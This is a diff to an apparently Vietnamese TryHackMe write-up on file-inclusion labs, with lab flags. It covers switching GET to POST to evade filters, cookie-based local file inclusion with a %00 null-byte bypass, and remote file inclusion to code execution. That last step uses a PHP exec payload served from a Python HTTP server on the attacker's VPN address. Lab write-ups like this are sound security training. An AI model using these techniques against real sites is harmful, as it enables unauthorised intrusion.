@@ -185,7 +185,108 @@ __
 
 ![image](https://user-images.githubusercontent.com/104350480/222922699-adc84bd6-0b60-4583-8bc3-c5bbd7fd4687.png)
 
-Có vẻ nó đang yêu cầu ta chuyển về giao thức POST, vậy sửa lại đường dẫn thôi
+Có vẻ nó đang yêu cầu ta chuyển về giao thức POST, vậy sửa lại method:
+
+![image](https://user-images.githubusercontent.com/104350480/222952864-5f919e5a-b311-43c0-9cfe-a0f209b1219d.png)
+
+Nhìn lỗi trả về, đơn giản ta chỉ cần thực hiện: 
+
+![image](https://user-images.githubusercontent.com/104350480/222952895-92d8dc65-e9c4-41e2-b8db-a89f47812c66.png)
+
+> flag: F1x3d-iNpu7-f0rrn
+
+
+__
+
+Lab2: Include a file in the input form below
+__
+
+Refresh page và bắt burp suite ta được:
+
+![image](https://user-images.githubusercontent.com/104350480/222952951-08462668-9e61-44ab-95b9-c8cd587081be.png)
+
+Sửa cookie thành admin:
+
+![image](https://user-images.githubusercontent.com/104350480/222952965-3fbc99b8-e218-43f0-aa1f-65ad4665e10b.png)
+
+Có vẻ như cookie có thể khai thác được:
+
+![image](https://user-images.githubusercontent.com/104350480/222953004-30a4d266-a9d5-4dd9-a0cd-e679a37c31e3.png)
+
+Thêm %00 ở cuối để bypass .php:
+
+![image](https://user-images.githubusercontent.com/104350480/222953060-f2d12ae5-ec36-4141-bf10-aef64b1010f1.png)
+
+> flag: c00k13_i5_yuMmy1
+
+__
+
+Lab3: Include a file in the input form below
+__
+
+Bài này thì dựa vào hint thôi, chứ thử ở biến GET mãi nó filter bằng hết rồi, thì web đang sử dụng $_REQUESTS_ , Biến $_REQUEST_ được sử dụng để truy cập thông tin về các biến được gửi đến server bằng cả hai phương thức GET và POST, ta có thể tận dụng bằng cách đổi method:
+
+![image](https://user-images.githubusercontent.com/104350480/222953294-a305c90e-e40b-4ece-96aa-90fc3f6065ac.png)
+
+> flag: P0st_1s_w0rk1in9
+
+__
+
+Lab #Playground: Include a file in the input form below
+__
+
+Bài này là bài lab của remote file inclusion, thực ra thì ý tưởng rất đơn giản ta chỉ cần dựng local, post file lên rồi truy cho máy chủ get file của ta 
+rồi thực thi lệnh 'hostname' ở đây là được. Vừa vào test /etc/passwd thì nó hiện luôn, hàm dính lỗi lfi ở include, ta dựa vào để rce, truyền vào 1 đường dẫn
+để thực thi.
+
+Tạo ở server file test.txt với nội dung: <?php print exec('hostname'); ?> để in ra hostname
+
+Dựng local với code bên dưới, để port 8000, có cái là có thể dựng nhanh bằng python3 -m http.server 8000, nhưng lúc thì nó cho thực hiện phương thức POST
+lúc thì không nên là cũng dựng thế này cho chắc.
+
+```
+import http.server
+import socketserver
+
+PORT = 8000
+
+class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+
+        # save the post_data to a file
+        with open('uploaded_file.txt', 'wb') as f:
+            f.write(post_data)
+
+        # send a response to the client
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b'File uploaded successfully')
+
+handler = MyRequestHandler
+
+with socketserver.TCPServer(("", PORT), handler) as httpd:
+    print("serving at port", PORT)
+    httpd.serve_forever()
+
+```
+
+Sau đấy dùng curl -X POST -d 'test.txt' **http://127.0.0.1:8000/test.txt** để post file lên server.
+
+![image](https://user-images.githubusercontent.com/104350480/222952526-76c5cb14-d1cf-40b5-b40b-32050d1fc344.png)
+
+Có 1 vấn đề là bình thường thì ta sẽ dựng ngrok để giúp kết nối từ máy chủ của tryhackme thực hiện get về server mình, nhưng mà thử mãi kh có phản hồi, 
+thì có vẻ như tryhackme kh cho kết nối bên ngoài như vậy, ở đây phải dùng địa chỉ IP của interface tun0 mà được tạo ra bởi kết nối vpn với tryhackme thì mới
+được. Thực ra thì cũng như nhau mà tryhackme không cho phép ngrok thì đành vậy.
+
+Thực hiện đường dẫn truyền vào param file ta được: **http://10.8.84.31 :8000/test.txt**
+
+![image](https://user-images.githubusercontent.com/104350480/222952764-fc3b8d27-938a-4356-b215-ae99b98b7326.png)
+
+> flag: lfi-vm-thm-f8c5b1a78692
+
 
 ## 4. Cách khắc phục
 
